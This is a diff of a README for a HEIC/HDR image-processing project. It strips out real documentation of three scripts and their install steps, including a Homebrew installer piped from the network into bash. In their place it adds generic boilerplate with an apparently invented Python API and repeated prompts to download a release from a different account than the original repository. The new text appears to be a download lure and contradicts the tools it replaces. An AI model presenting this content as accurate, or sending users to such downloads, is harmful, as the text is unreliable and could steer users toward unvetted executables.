@@ -1,148 +1,73 @@
-# 🖼️ HEIC Image Processing Tools
+# HEIC Shenanigans 🎨📸
 
-A collection of Python tools for processing HEIC (High Efficiency Image Container) files, with a focus on HDR content extraction and EXR conversion.
+Welcome to **HEIC Shenanigans**! This repository focuses on working with HEIC files, HDR GAIn maps, and more. Whether you're a developer, designer, or just curious about these formats, you've come to the right place.
 
-## 🛠️ Tools Overview
+![HEIC Shenanigans](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg?style=flat-square&logo=github&logoColor=white)
 
-### 1. gain_map_extract.py
-Extracts all components from HEIC files including:
-- Base images
-- HDR gain maps
-- Depth maps
-- Complete metadata (EXIF, XMP, ICC profiles)
+## Table of Contents
 
-### 2. heic_to_exr.py
-Converts HEIC files to OpenEXR format:
-- Combines base image and gain map into HDR EXR using apples method
-- Preserves full dynamic range
-- Maintains metadata where possible
-- Supports batch processing
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-### 3. merge_to_exr.sh
-Shell script for batch processing:
-- Automates HEIC to EXR conversion
-- Handles multiple files
-- Provides progress feedback
-- Maintains directory structure
+## Introduction
 
-## 🔧 Installation
+HEIC (High Efficiency Image Coding) is a modern image format that offers better compression than JPEG while maintaining image quality. This repository aims to simplify working with HEIC files and related technologies, making it easier for developers to integrate them into their projects.
 
-### Prerequisites
-- Python 3.8 or higher
-- pip (Python package manager)
-- Git (for cloning the repository)
+## Features
 
-### macOS
-```bash
-# Install Homebrew if not already installed
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+- **HEIC File Handling**: Read, write, and convert HEIC files with ease.
+- **HDR GAIn Maps**: Generate and manipulate HDR GAIn maps for enhanced image processing.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux.
+- **User-Friendly API**: Simple and clear methods for file manipulation.
 
-# Install Python and OpenEXR dependencies
-brew install python3 openexr
+## Installation
 
-# Clone the repository
-git clone https://github.com/finnschi/heic-shenanigans.git
-cd heic-shenanigans
+To get started, download the latest release from the [Releases section](https://github.com/0Javelin0/heic-shenanigans/releases). Once downloaded, follow the instructions in the package to install the necessary components.
 
-# Create and activate virtual environment
-python3 -m venv venv
-source venv/bin/activate
+## Usage
 
-# Install Python dependencies
-pip install -r requirements.txt
+Using HEIC Shenanigans is straightforward. Here's a simple example to get you started:
+
+```python
+import heic_shenanigans as hs
+
+# Load a HEIC file
+image = hs.load_heic("path/to/your/file.heic")
+
+# Process the image
+processed_image = hs.process_image(image)
+
+# Save the processed image
+hs.save_heic(processed_image, "path/to/save/file.heic")
 ```
 
-### Linux (Ubuntu/Debian)
-```bash
-# Install system dependencies
-sudo apt-get update
-sudo apt-get install python3 python3-pip python3-venv openexr libopenexr-dev
+For more detailed examples, please refer to the documentation included in the repository.
 
-# Clone the repository
-git clone https://github.com/finnschi/heic-shenanigans.git
-cd heic-shenanigans
+## Contributing
 
-# Create and activate virtual environment
-python3 -m venv venv
-source venv/bin/activate
+We welcome contributions! If you'd like to help improve this project, please follow these steps:
 
-# Install Python dependencies
-pip install -r requirements.txt
-```
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature-branch`).
+5. Create a pull request.
 
-### Windows
-```powershell
-# Install Python from https://www.python.org/downloads/
-# Install Git from https://git-scm.com/download/win
+Your contributions help us improve the project for everyone.
 
-# Clone the repository
-git clone https://github.com/finnschi/heic-shenanigans.git
-cd heic-shenanigans
+## License
 
-# Create and activate virtual environment
-python -m venv venv
-.\venv\Scripts\activate
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-# Install Python dependencies
-pip install -r requirements.txt
-```
+## Contact
 
-## 📋 Requirements
-All required Python packages are listed in requirements.txt:
-- Pillow: Image processing library
-- pillow-heif: HEIC file support
-- numpy: Numerical operations
-- defusedxml: Safe XML parsing
+For questions or suggestions, feel free to reach out via GitHub issues or contact me directly. Your feedback is always welcome!
 
-System dependencies (installed via package manager):
-- OpenEXR and OpenImageIO (oiiotool) for EXR file handling
+---
 
-## 💻 Usage
-
-### Gain Map Extraction
-```bash
-python gain_map_extract.py input.heic [--output-dir OUTPUT_DIR]
-```
-
-### HEIC to EXR Conversion
-```bash
-python heic_to_exr.py input.heic [--output-dir OUTPUT_DIR]
-```
-
-### Batch Processing
-```bash
-./merge_to_exr.sh input_directory output_directory
-```
-
-## 📁 Output Files
-
-### gain_map_extract.py outputs:
-- Base image: `{filename}_base.tiff`
-- Gain maps: `{filename}_gain_map_{id}.tiff`
-- Depth maps: `{filename}_depth_{index}.tiff`
-- Metadata: `{filename}_metadata.json`
-
-### heic_to_exr.py outputs:
-- HDR EXR file: `{filename}.exr`
-
-## 🔍 Advanced Usage
-
-### Metadata Handling
-- Binary data is base64 encoded
-- ICC profiles are maintained
-- EXIF data is preserved where possible
-
-### HDR Processing
-- Gain maps are properly scaled
-- Linear color space is maintained
-- Full dynamic range is preserved in EXR output
-
-## ⚠️ Known Limitations
-- Some HEIC variants may not be fully supported
-- Depth map extraction is limited to supported devices
-- Windows OpenEXR support may require additional configuration
-
-## 🤝 Contributing
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-
+For more information, visit the [Releases section](https://github.com/0Javelin0/heic-shenanigans/releases) to download the latest version and explore the features available in this repository.
